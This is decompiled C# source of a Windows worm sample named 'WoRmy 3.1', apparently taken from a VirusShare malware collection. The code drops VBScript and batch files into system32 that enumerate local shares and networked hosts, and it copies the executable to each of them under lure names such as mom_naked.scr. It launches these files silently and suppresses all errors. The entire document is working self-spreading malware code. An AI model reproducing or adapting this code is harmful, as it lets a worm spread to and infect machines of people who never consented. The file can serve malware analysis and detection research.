// Decompiled with JetBrains decompiler
// Type: .
// Assembly: WoRmy 3.1, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5B3F2157-9C5E-49FF-827C-36A43C2192D1
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00007-msil\Worm.MSIL.Autorun.bn-c84e33c1883ca2f034c2d20e5c59a5319d95e9525a9ab0a5111aecbd19ba55e7.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;

namespace \u001B\u0003
{
  [StandardModule]
  internal sealed class \u001F\u0003
  {
    public static void \u0097\u0003()
    {
      try
      {
        StreamWriter streamWriter1 = new StreamWriter((Stream) new FileStream("C:\\windows\\system32\\net.vbs", FileMode.Create, FileAccess.Write));
        streamWriter1.BaseStream.Seek(0L, SeekOrigin.End);
        streamWriter1.WriteLine("strComputer =\".\"");
        streamWriter1.WriteLine("Set objWMIService = GetObject(\"winmgmts:\"_ ");
        streamWriter1.WriteLine("& \"{impersonationLevel=impersonate}!\\\\\" & strComputer & \"\\root\\cimv2\")");
        streamWriter1.WriteLine("Set colShares = objWMIService.ExecQuery(\"Select * from Win32_Share\")");
        streamWriter1.WriteLine("For each objShare in colShares ");
        streamWriter1.WriteLine("Stuff = objShare.Path ");
        streamWriter1.WriteLine("Set myFSO = CreateObject(\"Scripting.FileSystemObject\") ");
        streamWriter1.WriteLine("Set WriteStuff = myFSO.OpenTextFile(\"C:\\windows\\system32\\logg.txt\", 8, True)");
        streamWriter1.WriteLine("WriteStuff.WriteLine(Stuff) ");
        streamWriter1.WriteLine("WriteStuff.Close ");
        streamWriter1.WriteLine("SET WriteStuff = NOTHING ");
        streamWriter1.WriteLine("Next ");
        streamWriter1.Close();
        StreamWriter streamWriter2 = new StreamWriter((Stream) new FileStream("C:\\windows\\system32\\net.bat", FileMode.Create, FileAccess.Write));
        streamWriter2.BaseStream.Seek(0L, SeekOrigin.End);
        streamWriter2.WriteLine("for /f \"delims=\" %%t in (C:\\windows\\system32\\logg.txt) do (");
        streamWriter2.WriteLine("copy " + Application.ExecutablePath + " %%t\\mom_naked.scr");
        streamWriter2.WriteLine(")");
        streamWriter2.WriteLine("net view >logidylog.txt");
        streamWriter2.WriteLine("for /f \"delims=\" %%o in (logidylog.txt) do (");
        streamWriter2.WriteLine("copy " + Application.ExecutablePath + " %%o\\$IPC\\mom_naked.scr");
        streamWriter2.WriteLine("copy " + Application.ExecutablePath + " %%o\\$C\\mom_naked.scr");
        streamWriter2.WriteLine("copy " + Application.ExecutablePath + " %%o\\$D\\mom_naked.scr");
        streamWriter2.WriteLine("copy " + Application.ExecutablePath + " %%o\\$ADMIN\\mom_naked.scr");
        streamWriter2.WriteLine("copy " + Application.ExecutablePath + " %%o\\$winnt\\mom_naked.scr");
        streamWriter2.WriteLine("copy " + Application.ExecutablePath + " %%o\\$print\\mom_naked.scr");
        streamWriter2.WriteLine("net view %%o >logi.txt");
        streamWriter2.WriteLine("for /f %%m in (logi.txt) do (");
        streamWriter2.WriteLine("copy " + Application.ExecutablePath + " \\\\%%o\\%%m\\sex_with_pamela_anderson_%random%.scr");
        streamWriter2.WriteLine(")");
        streamWriter2.WriteLine(")");
        streamWriter2.Close();
        Process.Start("C:\\windows\\system32\\net.vbs");
        StreamWriter streamWriter3 = new StreamWriter((Stream) new FileStream("C:\\windows\\system32\\launch.vbs", FileMode.Create, FileAccess.Write));
        streamWriter3.BaseStream.Seek(0L, SeekOrigin.End);
        streamWriter3.WriteLine("Dim oShell");
        streamWriter3.WriteLine("Set oShell = WScript.CreateObject (\"WScript.Shell\")");
        streamWriter3.WriteLine("oShell.run \"C:\\windows\\system32\\net.bat\",0,True");
        streamWriter3.WriteLine("Set oShell = Nothing ");
        streamWriter3.Close();
        Process.Start("C:\\windows\\system32\\launch.vbs");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
